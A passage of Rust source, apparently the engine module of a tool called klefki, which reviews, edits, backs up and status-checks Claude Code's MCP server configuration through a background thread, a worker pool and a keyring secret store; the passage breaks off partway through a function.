//! The engine: one background thread owns the state, a small worker pool runs live status checks, and the UI
//! only sees events. The UI never touches files, processes or the network.
use crate::api::{Scope, ServerId, ServerRow, Snapshot, Status};
use crate::cli::locate;
use crate::cli::parse;
use crate::cli::runner::{self, RunOutput, RunSpec};
use crate::config::ConfigPaths;
use crate::config::docstore::{Docstore, Plan};
use crate::config::entry;
use crate::config::fsx;
use crate::config::inventory;
use crate::diagnose::hints::{HintKind, hints_for};
use crate::diagnose::report;
use crate::model::ServerName;
use crate::ops;
use crate::sanitize::{clip, sanitize};
use crate::secrets::{Secret, SecretStore};
use crate::watch::{self, Watch};
use std::collections::{HashMap, VecDeque};
use std::ffi::{OsStr, OsString};
use std::io;
use std::ops::Range;
use std::path::{Path, PathBuf};
use std::sync::atomic::{AtomicU64, Ordering};
use std::sync::mpsc::{self, Receiver, Sender};
use std::sync::{Arc, Condvar, Mutex, MutexGuard, RwLock};
use std::time::Duration;

#[derive(Debug, Clone, PartialEq, Eq)]
pub enum Command {
    /// Reload the configuration. With `live_all`, also re-check every checkable server, not just the ones whose
    /// status Claude does not already know.
    Refresh { live_all: bool },
    /// Check one server now. This is the only way a project (`.mcp.json`) server is checked, because checking
    /// it runs the repository's command.
    Check(ServerId),
    /// Check one server again with the client's own debug output and explain what went wrong. Like `Check`,
    /// this runs a project server's command, so it only happens on request.
    Diagnose(ServerId),
    /// Work out what the changes would do to the configuration, and show it. Writes nothing.
    Prepare(Vec<Change>),
    /// Write a plan shown by [`Event::PlanReady`]. A plan can be applied once.
    Apply(u64),
    /// The user declined a plan.
    Discard(u64),
    /// Send the server's definition, for viewing and editing (see [`Event::Entry`]).
    Inspect(ServerId),
    /// Whether a client secret is stored for this OAuth server (see [`Event::SecretStatus`]).
    SecretStatus(ServerId),
    /// Keep this client secret for the OAuth server, in the system's secret store.
    StoreSecret {
        id: ServerId,
        secret: crate::secrets::Secret,
    },
    /// Remove the server's client secret from the system's secret store.
    ForgetSecret(ServerId),
}

/// Something the user wants changed. Targets are rows of the current inventory; project scope cannot be
/// created, only toggled.
#[derive(Debug, Clone, PartialEq, Eq)]
pub enum Change {
    /// Turn a server on or off (`/mcp disable`). For a user server this covers every project Claude knows.
    SetEnabled { id: ServerId, enabled: bool },
    /// Let Claude Code run a project (`.mcp.json`) server: the one thing written inside a repository. The plan
    /// shows everything the server would run first.
    Approve { id: ServerId },
    /// Delete a user or local server. Project servers live in the repository's `.mcp.json`, which klefki does not
    /// edit.
    Delete { id: ServerId },
    /// Replace the definition of a user or local server with `json`, as edited from [`Event::Entry`]: values shown
    /// as `<hidden>` keep the value they had.
    Replace { id: ServerId, json: String },
    /// Copy a user or local server, definition and secrets included, to each of `targets` as `name`.
    Duplicate {
        id: ServerId,
        name: String,
        targets: Vec<crate::model::Target>,
    },
}

/// What a plan would change in one file. Lines starting with `+ ` are additions, `- ` removals, two spaces a
/// heading. Sanitised, and never carries server settings.
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct FileDiff {
    pub path: String,
    pub lines: Vec<String>,
}

/// What a change lets Claude Code run, shown in full before the user agrees. Sanitised; nothing is shortened.
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct Review {
    pub title: String,
    pub lines: Vec<String>,
}

#[derive(Debug, Clone, PartialEq, Eq)]
pub struct PlanView {
    pub id: u64,
    /// One plain sentence per change, for the top of the review.
    pub summary: Vec<String>,
    /// The confirm button's label ("Turn off", "Delete", "Approve", "Save", or "Apply" for a mix).
    pub action: String,
    /// The plan removes something: the confirm button is shown as dangerous.
    pub destructive: bool,
    pub files: Vec<FileDiff>,
    pub reviews: Vec<Review>,
    pub warnings: Vec<String>,
    /// Good to know, shown more quietly than warnings.
    pub notes: Vec<String>,
    /// The configuration already looks like this; applying would write nothing.
    pub nothing_to_do: bool,
}

/// One plain-language explanation of a common failure, in the parts a compiler error has.
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct Hint {
    pub title: String,
    /// The error code it was reported with, such as `ENOTFOUND`.
    pub code: Option<String>,
    /// What to do, one step per line, the most likely fix first.
    pub help: Vec<String>,
    /// The part of the server's command or URL the failure is about, and what to say under it.
    pub points_at: Option<(Focus, String)>,
}

/// A part of a server's command line or URL.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum Focus {
    /// The host name of the URL.
    Host,
    /// Host and port.
    Address,
    /// The URL's path.
    Path,
    /// The program, without its arguments.
    Command,
}

impl Hint {
    /// Where in `target` (a row's command line or URL, as shown) the failure is, as a byte range. `said` is
    /// Claude's own message, which tells how much of a command line is the program when its path has spaces.
    pub fn span(&self, target: &str, said: Option<&str>) -> Option<Range<usize>> {
        let (focus, _) = self.points_at.as_ref()?;
        let Some(scheme_end) = target.find("://") else {
            if *focus != Focus::Command {
                return None;
            }
            let first = target.find(' ').unwrap_or(target.len());
            let mut ends = target
                .match_indices(' ')
                .map(|(i, _)| i)
                .chain([target.len()]);
            let named = said.and_then(|s| ends.rfind(|&e| s.contains(&target[..e])));
            let end = named.unwrap_or(first).max(first);
            return (end > 0).then_some(0..end);
        };
        let start = scheme_end + 3;
        let rest = &target[start..];
        let authority = rest.find(['/', '?', '#']).unwrap_or(rest.len());
        let host_at = rest[..authority].rfind('@').map_or(0, |i| i + 1);
        let host = &rest[host_at..authority];
        let host_len = if host.starts_with('[') {
            host.find(']').map_or(host.len(), |i| i + 1)
        } else {
            host.find(':').unwrap_or(host.len())
        };
        let range = match focus {
            Focus::Host => start + host_at..start + host_at + host_len,
            Focus::Address => start + host_at..start + authority,
            Focus::Path => {
                let path = &rest[authority..];
                start + authority..start + authority + path.find(['?', '#']).unwrap_or(path.len())
            }
            Focus::Command => return None,
        };
        (!range.is_empty()).then_some(range)
    }
}

/// What the client's debug output says about one server, made safe to show: sanitised, with secrets redacted.
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct Diagnosis {
    pub status: Status,
    pub detail: Option<String>,
    pub hints: Vec<Hint>,
    /// What the server process itself printed on stderr.
    pub server_said: Vec<String>,
    /// The client's log lines about this server.
    pub client_log: Vec<String>,
    /// Set when diagnosing itself ran into trouble (could not start, timed out, no debug output).
    pub note: Option<String>,
}

#[derive(Debug, Clone)]
pub enum Event {
    Snapshot(Arc<Snapshot>),
    CliVersion(Option<String>),
    /// The CLI could not be found or used; live checks are unavailable.
    CliProblem(String),
    /// Whether a client secret is stored for the server, after asking or after storing or forgetting one; `Err` says
    /// why the store could not answer or the change was refused. Never carries the secret.
    SecretStatus {
        id: ServerId,
        stored: Result<bool, String>,
    },
    Status {
        id: ServerId,
        status: Status,
        detail: Option<String>,
        /// What `detail` most likely means, in plain language. `None` when it matches no known failure.
        hint: Option<Hint>,
    },
    Diagnosis {
        id: ServerId,
        diagnosis: Diagnosis,
    },
    PlanReady(PlanView),
    /// The changes could not be turned into a plan (nothing was written).
    PlanFailed(String),
    /// The plan was written. `backup` is where the previous contents were saved.
    Applied {
        plan: u64,
        /// Anything was written. `false` when the files already looked like this.
        changed: bool,
        /// Where the previous contents were saved (several places are joined), when there were any.
        backup: Option<String>,
    },
    /// Nothing was written, or the change could not be kept.
    ApplyFailed {
        plan: u64,
        error: String,
    },
    /// Claude Code overwrote the change right after it was written, and it was put back.
    Reapplied {
        plan: u64,
    },
    /// A server's definition as pretty JSON, environment and header values replaced by `<hidden>`, or why it could
    /// not be read. `editable` is false for project servers (the repository's file).
    Entry {
        id: ServerId,
        json: Result<String, String>,
        editable: bool,
    },
}

/// The UI's handle to the engine.
pub struct Core {
    tx: Sender<Command>,
    rx: Receiver<Event>,
}

impl Core {
    pub fn send(&self, command: Command) {
        let _ = self.tx.send(command);
    }

    /// The next event, if one is ready. Never blocks.
    pub fn try_recv(&self) -> Option<Event> {
        self.rx.try_recv().ok()
    }

    /// A `Core` that is not connected to an engine, for testing code that talks to one: the test plays the
    /// engine's part through [`Detached`].
    #[doc(hidden)]
    pub fn detached() -> (Core, Detached) {
        let (tx, commands) = mpsc::channel();
        let (events, rx) = mpsc::channel();
        (Core { tx, rx }, Detached { commands, events })
    }
}

/// The engine's side of a [`Core::detached`] pair.
#[doc(hidden)]
pub struct Detached {
    pub commands: Receiver<Command>,
    pub events: Sender<Event>,
}

/// Everything the engine needs. Passed in, so tests never depend on the real environment.
pub(crate) struct EngineConfig {
    /// Where Claude keeps its files; `None` when the home folder cannot be found.
    pub paths: Option<ConfigPaths>,
    /// A user-configured path to the Claude CLI.
    pub claude: Option<PathBuf>,
    pub home: Option<PathBuf>,
    /// Private folder for backups of `.claude.json` before it is changed. Without it nothing is written.
    pub backup_dir: Option<PathBuf>,
    /// How long after a write to look again for an unlocked overwrite by Claude Code.
    pub verify_delay: Duration,
    pub path_var: Option<OsString>,
    /// Extra environment for the CLI. Used by tests to point `fake-claude` at a scenario.
    pub cli_env: Vec<(String, OsString)>,
    pub max_checks: usize,
    pub check_timeout: Duration,
    /// How often to look for changes made to the configuration from outside; `None` turns watching off.
    pub watch_interval: Option<Duration>,
    /// How long changed files must hold still before they are read again.
    pub watch_settle: Duration,
    /// Where client secrets are kept: `None` for the system's own store, opened when first needed (so starting
    /// never waits on it); tests give an in-memory one.
    pub secrets: Option<Arc<dyn SecretStore>>,
}

const MAX_CHECK_OUTPUT: usize = 64 * 1024;
const MAX_DEBUG_FILE: u64 = 1024 * 1024;
const VERSION_TIMEOUT: Duration = Duration::from_secs(10);
const MAX_DETAIL_CHARS: usize = 200;

pub(crate) fn start_with(config: EngineConfig, wake: impl Fn() + Send + Sync + 'static) -> Core {
    let (tx, cmd_rx) = mpsc::channel::<Command>();
    let (ev_tx, rx) = mpsc::channel();
    let emitter = Emitter {
        tx: ev_tx,
        wake: Arc::new(wake),
    };
    // The engine listens to the UI and to the file watcher. The UI's commands are passed on, and when the UI goes
    // away the engine is told to stop (the watcher keeps a sender of its own, so the channel alone would not close).
    let (input_tx, input_rx) = mpsc::channel();
    let ui = input_tx.clone();
    std::thread::Builder::new()
        .name("klefki-commands".into())
        .stack_size(64 * 1024)
        .spawn(move || {
            for command in cmd_rx {
                if ui.send(Input::Ui(command)).is_err() {
                    return;
                }
            }
            let _ = ui.send(Input::Closed);
        })
        .expect("start the command relay");
    std::thread::spawn(move || engine_main(config, input_rx, input_tx, emitter));
    Core { tx, rx }
}

/// What the engine thread reacts to.
enum Input {
    Ui(Command),
    /// The watcher saw the configuration change on disk.
    FilesChanged,
    /// The UI is gone.
    Closed,
}

#[derive(Clone)]
struct Emitter {
    tx: Sender<Event>,
    wake: Arc<dyn Fn() + Send + Sync>,
}

impl Emitter {
    fn emit(&self, event: Event) {
        let _ = self.tx.send(event);
        (self.wake)();
    }

    fn status(&self, id: ServerId, status: Status, detail: Option<String>) {
        let hint = match status {
            Status::Failed | Status::Degraded | Status::NeedsAuth => detail
                .as_deref()
                .and_then(|d| Some(hint(*hints_for(d).first()?, d))),
            _ => None,
        };
        self.emit(Event::Status {
            id,
            status,
            detail,
            hint,
        });
    }
}

#[derive(Clone, Copy, PartialEq, Eq)]
enum JobKind {
    Check,
    Diagnose,
}

struct Job {
    generation: u64,
    id: ServerId,
    /// Already validated; it is passed to the CLI as its own argument.
    name: ServerName,
    cwd: PathBuf,
    kind: JobKind,
    /// Tell the UI the check is running (only for rows that have nothing better to show meanwhile).
    announce: bool,
}

#[derive(Default)]
struct Queue {
    jobs: VecDeque<Job>,
    shutdown: bool,
}

struct Shared {
    config: EngineConfig,
    queue: Mutex<Queue>,
    wake_workers: Condvar,
    generation: AtomicU64,
    claude: RwLock<Option<PathBuf>>,
    /// The CLI's version, for the program file it was read from. Asking costs a process start (Claude Code is a
    /// large Node program), so it is only asked again when the file changes.
    version: Mutex<Option<(ProgramStamp, Option<String>)>>,
    /// The secret store once opened. Not kept when opening failed, so a store unlocked later is found.
    secret_store: Mutex<Option<Arc<dyn SecretStore>>>,
    /// Per file, the redo log of klefki's changes whose check is still due.
    journals: Arc<Mutex<HashMap<PathBuf, Journal>>>,
    emitter: Emitter,
    /// For threads that need the engine thread to do something (read the files again).
    input: Sender<Input>,
}

/// Identifies one build of the CLI on disk: its path, size and modification time.
#[derive(Clone, PartialEq, Eq)]
struct ProgramStamp {
    path: PathBuf,
    len: u64,
    modified: Option<std::time::SystemTime>,
}

impl ProgramStamp {
    fn of(path: &Path) -> Option<Self> {
        let meta = std::fs::metadata(path).ok()?;
        Some(Self {
            path: path.to_owned(),
            len: meta.len(),
            modified: meta.modified().ok(),
        })
    }
}

fn engine_main(
    config: EngineConfig,
    inputs: Receiver<Input>,
    input_tx: Sender<Input>,
    emitter: Emitter,
) {
    let workers = config.max_checks.max(1);
    let shared = Arc::new(Shared {
        config,
        queue: Mutex::new(Queue::default()),
        wake_workers: Condvar::new(),
        generation: AtomicU64::new(0),
        claude: RwLock::new(None),
        version: Mutex::new(None),
        journals: Arc::default(),
        secret_store: Mutex::new(None),
        emitter,
        input: input_tx.clone(),
    });
    for _ in 0..workers {
        let shared = Arc::clone(&shared);
        std::thread::spawn(move || worker(&shared));
    }

    let watch = shared.config.watch_interval.map(|interval| {
        Watch::start(interval, shared.config.watch_settle, move || {
            let _ = input_tx.send(Input::FilesChanged);
        })
    });
    let mut state = State {
        snapshot: Arc::new(Snapshot::default()),
        watch,
    };
    let mut plans = Plans::default();
    refresh(&shared, &mut state, false);
    while let Ok(input) = inputs.recv() {
        let command = match input {
            Input::Ui(command) => command,
            Input::FilesChanged => {
                reload_after_change(&shared, &mut state);
                continue;
            }
            Input::Closed => break,
        };
        match command {
            Command::Prepare(changes) => prepare(&shared, &mut plans, &changes),
            Command::Apply(id) => apply(&shared, &mut plans, &mut state, id),
            Command::Discard(id) => {
                plans.stored.remove(&id);
            }
            Command::Refresh { live_all } => refresh(&shared, &mut state, live_all),
            Command::Check(id) => enqueue_now(&shared, &state.snapshot, &id, JobKind::Check),
            Command::Diagnose(id) => enqueue_now(&shared, &state.snapshot, &id, JobKind::Diagnose),
            Command::Inspect(id) => inspect(&shared, id),
            Command::SecretStatus(id) => secret(&shared, &state.snapshot, id, SecretOp::Status),
            Command::StoreSecret { id, secret: value } => {
                secret(&shared, &state.snapshot, id, SecretOp::Store(value));
            }
            Command::ForgetSecret(id) => secret(&shared, &state.snapshot, id, SecretOp::Forget),
        }
    }
    // The UI is gone: let the workers finish what they are doing and stop.
    lock(&shared.queue).shutdown = true;
    shared.wake_workers.notify_all();
}

enum SecretOp {
    Status,
    Store(Secret),
    Forget,
}

/// Looks up, stores or forgets a server's client secret, on a thread of its own: a store may be slow, or ask the
/// user (macOS shows a keychain prompt). Only servers that sign in with OAuth have one.
fn secret(shared: &Shared, snapshot: &Snapshot, id: ServerId, op: SecretOp) {
    let answer = |stored: Result<bool, String>| {
        shared.emitter.emit(Event::SecretStatus {
            id: id.clone(),
            stored,
        });
    };
    let Some(row) = snapshot.servers.iter().find(|r| r.is(&id)) else {
        return answer(Err(format!(
            "{} is no longer in the configuration.",
            sanitize(&id.name)
        )));
    };
    if row.oauth.is_none() {
        return answer(Err(format!(
            "{} does not sign in with OAuth, so it has no client secret.",
            sanitize(&id.name)
        )));
    }
    if matches!(&op, SecretOp::Store(s) if s.is_empty()) {
        return answer(Err("The client secret is empty.".to_owned()));
    }
    let store = {
        let mut held = lock(&shared.secret_store);
        match (&*held, &shared.config.secrets) {
            (Some(store), _) | (None, Some(store)) => Arc::clone(store),
            (None, None) => match crate::secrets::Keyring::platform() {
                Ok(store) => {
                    let store: Arc<dyn SecretStore> = Arc::new(store);
                    *held = Some(Arc::clone(&store));
                    store
                }
                Err(e) => return answer(Err(e.to_string())),
            },
        }
    };
    let connection = row.connection.clone();
    let emitter = shared.emitter.clone();
    std::thread::spawn(move || {
        let stored = match op {
            SecretOp::Status => store.get(&connection).map(|s| s.is_some()),
            SecretOp::Store(value) => store.set(&connection, &value).map(|()| true),
            SecretOp::Forget => store.delete(&connection).map(|_| false),
        };
        emitter.emit(Event::SecretStatus {
            id,
            stored: stored.map_err(|e| e.to_string()),
        });
    });
}

fn inspect(shared: &Shared, id: ServerId) {
    let in_repository = id.scope == Scope::Project;
    let json = match &shared.config.paths {
        None => Err("Could not determine where Claude Code keeps its configuration.".to_owned()),
        Some(paths) => {
            inventory::server_entry(paths, id.project.as_deref(), &id.name, in_repository).and_then(
                |entry| {
                    serde_json::to_string_pretty(&entry::masked(&entry)).map_err(|e| e.to_string())
                },
            )
        }
    };
    shared.emitter.emit(Event::Entry {
        id,
        // Text from the files, shown in an editor: no control or bidi characters.
        json: json.map(|j| sanitize(&j)).map_err(|e| sanitize(&e)),
        editable: !in_repository,
    });
}

/// A prepared change: one plan per file, written settings files first and `.claude.json` last.
struct Stored {
    parts: Vec<(Plan, Docstore)>,
    guards: Vec<ops::Guard>,
}

#[derive(Default)]
struct Plans {
    next: u64,
    stored: HashMap<u64, Stored>,
}

fn backup_dir(shared: &Shared) -> Result<PathBuf, String> {
    shared.config.backup_dir.clone().ok_or_else(|| {
        "There is no private folder for backups, so nothing will be changed.".to_owned()
    })
}

fn prepare(shared: &Shared, plans: &mut Plans, changes: &[Change]) {
    let made = (|| {
        let paths = shared.config.paths.as_ref().ok_or_else(|| {
            "Could not determine where Claude Code keeps its configuration.".to_owned()
        })?;
        // Always against the files as they are now, not the snapshot the user last saw. `.claude.json` is read once
        // for both the inventory and the plan.
        let read = fsx::read_limited_bom(&paths.claude_json, inventory::MAX_CLAUDE_JSON);
        let fresh = inventory::load_text(
            paths,
            match &read {
                Ok(text) => Ok(text.as_ref().map(|(t, _)| t.as_str())),
                Err(e) => Err(e.to_string()),
            },
        );
        let mut resolved = ops::resolve(changes, &fresh)?;
        let mut parts = Vec::new();
        for (project, ops) in std::mem::take(&mut resolved.settings) {
            let file = Path::new(&project)
                .join(".claude")
                .join("settings.local.json");
            let store = Docstore::project_settings(file, backup_dir(shared)?);
            let plan = store.prepare(ops).map_err(|e| e.to_string())?;
            parts.push((plan, store));
        }
        if !resolved.claude.is_empty() {
            let mut store = Docstore::new(paths.claude_json.clone(), backup_dir(shared)?);
            store.verify_delay = shared.config.verify_delay;
            let claude_ops = std::mem::take(&mut resolved.claude);
            let plan = match read {
                Ok(Some((text, bom))) => store.prepare_text(text, bom, claude_ops),
                _ => store.prepare(claude_ops),
            }
            .map_err(|e| e.to_string())?;
            parts.push((plan, store));
        }
        for (_, store) in &mut parts {
            store.verify_delay = shared.config.verify_delay;
        }
        Ok::<_, String>((parts, resolved))
    })();
    match made {
        Ok((parts, resolved)) => {
            let ops::Resolved {
                guards,
                warnings,
                notes,
                summary,
                action,
                destructive,
                reviews,
                ..
            } = resolved;
            plans.next += 1;
            let id = plans.next;
            let nothing_to_do = parts.iter().all(|(plan, _)| plan.is_empty());
            let view = PlanView {
                id,
                summary,
                action,
                destructive,
                notes: if nothing_to_do { Vec::new() } else { notes },
                files: parts
                    .iter()
                    .flat_map(|(plan, _)| plan.changes())
                    .filter(|c| !c.lines.is_empty())
                    .map(|c| FileDiff {
                        path: c.path.clone(),
                        lines: c.lines.clone(),
                    })
                    .collect(),
                // Nothing to approve when nothing would be written.
                reviews: if nothing_to_do { Vec::new() } else { reviews },
                warnings,
                nothing_to_do,
            };
            plans.stored.insert(id, Stored { parts, guards });
            shared.emitter.emit(Event::PlanReady(view));
        }
        Err(e) => shared.emitter.emit(Event::PlanFailed(sanitize(&e))),
    }
}

fn apply(shared: &Shared, plans: &mut Plans, state: &mut State, id: u64) {
    let fail = |error: String| {
        shared.emitter.emit(Event::ApplyFailed { plan: id, error });
    };
    let Some(Stored { parts, guards }) = plans.stored.remove(&id) else {
        return fail("This change was already applied or discarded. Prepare it again.".to_owned());
    };
    // What the user reviewed must still be what is there.
    if let Some(changed) = guards.iter().find(|g| !g.still_holds()) {
        return fail(format!(
            "{} changed in {} after you looked at it. Nothing was saved; review it again.",
            sanitize(&changed.name),
            sanitize(&changed.project)
        ));
    }
    let mut written = Vec::new();
    let mut backups = Vec::new();
    // Every file this change starts on, with its sequence number there; each gets checked afterwards, written or not.
    let mut started = Vec::new();
    for (plan, store) in &parts {
        // Numbered before the write, so an earlier change's check that takes the lock after it already knows.
        let lsn = lock(&shared.journals)
            .entry(store.path.clone())
            .or_default()
            .start();
        started.push((store.clone(), lsn));
        match store.apply(plan) {
            Ok(applied) => {
                if applied.wrote {
                    lock(&shared.journals)
                        .entry(store.path.clone())
                        .or_default()
                        .pending
                        .push((lsn, plan.clone()));
                    written.push(plan.clone());
                }
                backups.extend(applied.backup);
            }
            Err(e) => {
                let mut message = e.to_string();
                if !written.is_empty() {
                    let done: Vec<String> = written
                        .iter()
                        .flat_map(|p| p.changes().iter().map(|c| c.path.clone()))
                        .collect();
                    message.push_str(&format!(
                        " Already saved: {}. The rest was not changed.",
                        done.join(", ")
                    ));
                    reload_after_change(shared, state);
                }
                // This change now numbers last on the file, so the earlier ones' checks stand down for it.
                check_later(shared, id, started);
                return fail(message);
            }
        }
    }
    let changed = !written.is_empty();
    if changed {
        reload_after_change(shared, state);
    }
    check_later(shared, id, started);
    shared.emitter.emit(Event::Applied {
        plan: id,
        changed,
        backup: (!backups.is_empty()).then(|| {
            sanitize(
                &backups
                    .iter()
                    .map(|b| b.display().to_string())
                    .collect::<Vec<_>>()
                    .join(", "),
            )
        }),
    });
}

/// The changes klefki wrote to one file and has not yet checked, oldest first: a small redo log. Claude Code may
/// write without our lock from a copy it read earlier; replaying the log in order puts every overwritten change
/// back, and two changes to the same thing end the way the later one says.
#[derive(Default)]
struct Journal {
    /// The sequence number of the latest change started on the file.
    latest: u64,
    pending: Vec<(u64, Plan)>,
}

impl Journal {
    fn start(&mut self) -> u64 {
        self.latest += 1;
        self.latest
    }
}

/// Shortly after a change, off the engine thread, checks each file it started on against that file's whole log.
/// Only the latest change on a file checks it (older ones stand down, the newest log covers theirs), the way a
/// database groups commits; once checked, the logged changes are retired.
fn check_later(shared: &Shared, id: u64, started: Vec<(Docstore, u64)>) {
    let journals = Arc::clone(&shared.journals);
    let logs: Vec<_> = {
        let j = lock(&journals);
        started
            .into_iter()
            .filter_map(|(store, lsn)| {
                let pending = &j.get(&store.path)?.pending;
                let last = pending.last()?.0;
                let log: Vec<Plan> = pending.iter().map(|(_, p)| p.clone()).collect();
                Some((store, lsn, last, log))
            })
            .collect()
    };
    if logs.is_empty() {
        return;
    }
    let emitter = shared.emitter.clone();
    let input = shared.input.clone();
    std::thread::spawn(move || {
        let mut reapplied = false;
        for (store, lsn, last, log) in &logs {
            let superseded = || lock(&journals).get(&store.path).map(|j| j.latest) != Some(*lsn);
            let result = store.verify(log, &superseded);
            // Retired whatever the outcome: a log that cannot be put back is reported now, not retried forever.
            if let Some(j) = lock(&journals).get_mut(&store.path)
                && j.latest == *lsn
            {
                j.pending.retain(|(n, _)| n > last);
            }
            match result {
                Ok(again) => reapplied |= again,
                Err(e) => {
                    return emitter.emit(Event::ApplyFailed {
                        plan: id,
                        error: e.to_string(),
                    });
                }
            }
        }
        if reapplied {
            // The engine thread reads the files again, as for any change on disk.
            let _ = input.send(Input::FilesChanged);
            emitter.emit(Event::Reapplied { plan: id });
        }
    });
}

fn lock<T>(m: &Mutex<T>) -> MutexGuard<'_, T> {
    m.lock().unwrap_or_else(|e| e.into_inner())
}

/// The engine thread's view: the current snapshot, and the watcher that tells when it is out of date.
struct State {
    snapshot: Arc<Snapshot>,
    watch: Option<Watch>,
}

impl State {
    /// Reads the configuration again and returns the snapshot it replaces. The watcher's baseline is taken just
    /// before reading, so a change made meanwhile is noticed afterwards instead of being lost.
    fn reload(&mut self, shared: &Shared) -> Arc<Snapshot> {
        let next = match &shared.config.paths {
            Some(paths) => {
                if let Some(watch) = &self.watch {
                    watch.rebase(watch::watched_files(paths, &self.snapshot));
                }
                let next = inventory::load(paths);
                if let Some(watch) = &self.watch {
                    // Projects that just appeared start being watched from now.
                    watch.extend(watch::watched_files(paths, &next));
                }
                next
            }
            None => Snapshot {
                warnings: vec![
                    "Could not determine where Claude Code keeps its configuration.".to_owned(),
                ],
                ..Snapshot::default()
            },
        };
        let before = std::mem::replace(&mut self.snapshot, Arc::new(next));
        shared
            .emitter
            .emit(Event::Snapshot(Arc::clone(&self.snapshot)));
        before
    }
}

fn refresh(shared: &Shared, state: &mut State, live_all: bool) {
    let generation = shared.generation.fetch_add(1, Ordering::SeqCst) + 1;
    lock(&shared.queue).jobs.clear();
    state.reload(shared);
    let snapshot = &state.snapshot;

    let cli = locate::locate(&locate::Search {
        explicit: shared.config.claude.as_deref(),
        home: shared.config.home.as_deref(),
        path_var: shared.config.path_var.as_deref(),
    });
    let program = match cli {
        Ok(p) => p,
        Err(e) => {
            *shared.claude.write().unwrap_or_else(|e| e.into_inner()) = None;
            shared.emitter.emit(Event::CliProblem(format!(
                "Live status is unavailable: {e}."
            )));
            return;
        }
    };
    *shared.claude.write().unwrap_or_else(|e| e.into_inner()) = Some(program.clone());
    shared
        .emitter
        .emit(Event::CliVersion(cached_cli_version(shared, &program)));

    let mut jobs = Vec::new();
    for row in &snapshot.servers {
        // Project servers run the repository's own command: only on an explicit request.
        let wanted = row.scope != Scope::Project
            && row.enabled
            && (live_all || row.status == Status::Unknown);
        if wanted
            && let Some(job) = build_job(
                shared,
                row,
                generation,
                JobKind::Check,
                row.status == Status::Unknown,
            )
        {
            jobs.push(job);
        }
    }
    // Servers with nothing to show yet go first.
    jobs.sort_by_key(|j| !j.announce);
    lock(&shared.queue).jobs.extend(jobs);
    shared.wake_workers.notify_all();
}

/// After the configuration changed (by klefki, or on disk from outside): show the new state, and check only servers
/// the change switched on. A full refresh would look for the CLI again, ask its version, drop the checks still
/// running and start them over, each one a process start that the change did not call for.
fn reload_after_change(shared: &Shared, state: &mut State) {
    if shared.config.paths.is_none() {
        return;
    }
    let before = state.reload(shared);
    let snapshot = &state.snapshot;
    let generation = shared.generation.load(Ordering::SeqCst);
    let jobs: Vec<Job> = snapshot
        .servers
        .iter()
        .filter(|row| {
            row.scope != Scope::Project
                && row.enabled
                && row.status == Status::Unknown
                && !before
                    .servers
                    .iter()
                    .any(|old| old.enabled && same_row(old, row))
        })
        .filter_map(|row| build_job(shared, row, generation, JobKind::Check, true))
        .collect();
    if !jobs.is_empty() {
        lock(&shared.queue).jobs.extend(jobs);
        shared.wake_workers.notify_all();
    }
}

/// The same server in two snapshots, compared without building ids.
fn same_row(a: &ServerRow, b: &ServerRow) -> bool {
    a.scope == b.scope && a.name == b.name && a.project == b.project
}

/// A check or diagnosis the user asked for: ahead of the background checks.
fn enqueue_now(shared: &Shared, snapshot: &Snapshot, id: &ServerId, kind: JobKind) {
    let Some(row) = snapshot.servers.iter().find(|r| r.is(id)) else {
        return;
    };
    let generation = shared.generation.load(Ordering::SeqCst);
    if let Some(job) = build_job(shared, row, generation, kind, true) {
        lock(&shared.queue).jobs.push_front(job);
        shared.wake_workers.notify_one();
    }
}

/// Turns a row into a job, or reports why it cannot be run. A name that is not safe never reaches a spawn.
fn build_job(
    shared: &Shared,
    row: &ServerRow,
    generation: u64,
    kind: JobKind,
    announce: bool,
) -> Option<Job> {
    let refuse = |why: String| {
        match kind {
            JobKind::Check => shared.emitter.status(
                row.id(),
                Status::Unknown,
                Some(format!("not checked: {why}")),
            ),
            JobKind::Diagnose => shared.emitter.emit(Event::Diagnosis {
                id: row.id(),
                diagnosis: Diagnosis {
                    status: Status::Unknown,
                    detail: None,
                    hints: Vec::new(),
                    server_said: Vec::new(),
                    client_log: Vec::new(),
                    note: Some(format!("not diagnosed: {why}")),
                },
            }),
        }
        None
    };
    let name = match ServerName::parse(&row.name) {
        Ok(n) => n,
        Err(e) => {
            return refuse(format!(
                "the server name is not safe to pass to claude ({e})"
            ));
        }
    };
    let cwd = match (row.scope, &row.project) {
        (Scope::User, _) => match &shared.config.home {
            Some(home) => home.clone(),
            None => return refuse("no home folder".to_owned()),
        },
        (_, Some(project)) => {
            if !inventory::is_safe_project_path(project) || !Path::new(project).is_dir() {
                return refuse("the project folder was not found".to_owned());
            }
            PathBuf::from(project)
        }
        (_, None) => return refuse("the project folder is unknown".to_owned()),
    };
    Some(Job {
        generation,
        id: row.id(),
        name,
        cwd,
        kind,
        announce,
    })
}

fn worker(shared: &Shared) {
    loop {
        let job = {
            let mut queue = lock(&shared.queue);
            loop {
                if queue.shutdown {
                    return;
                }
                if let Some(job) = queue.jobs.pop_front() {
                    break job;
                }
                queue = shared
                    .wake_workers
                    .wait(queue)
                    .unwrap_or_else(|e| e.into_inner());
            }
        };
        let current = || shared.generation.load(Ordering::SeqCst) == job.generation;
        if !current() {
            continue;
        }
        if job.announce {
            shared
                .emitter
                .status(job.id.clone(), Status::Checking, None);
        }
        match job.kind {
            JobKind::Check => {
                let (status, detail) = execute(shared, &job);
                // A refresh may have replaced the world while this ran; its answer would be about a stale row.
                if current() {
                    shared.emitter.status(job.id.clone(), status, detail);
                }
            }
            JobKind::Diagnose => {
                let diagnosis = run_diagnose(shared, &job);
                if current() {
                    shared.emitter.status(
                        job.id.clone(),
                        diagnosis.status,
                        diagnosis.detail.clone(),
                    );
                    shared.emitter.emit(Event::Diagnosis {
                        id: job.id.clone(),
                        diagnosis,
                    });
                }
            }
        }
    }
}

fn cli_env(shared: &Shared) -> Vec<(&str, &OsStr)> {
    shared
        .config
        .cli_env
        .iter()
        .map(|(k, v)| (k.as_str(), v.as_os_str()))
        .collect()
}

fn cached_cli_version(shared: &Shared, program: &Path) -> Option<String> {
    let stamp = ProgramStamp::of(program);
    if let (Some(stamp), Some((known, version))) = (&stamp, &*lock(&shared.version))
        && stamp == known
    {
        return version.clone();
    }
    let version = cli_version(shared, program);
    // Only an answer is kept: a failed ask (a timeout, a virus scan on first start) is tried again next time.
    if let (Some(stamp), Some(_)) = (stamp, &version) {
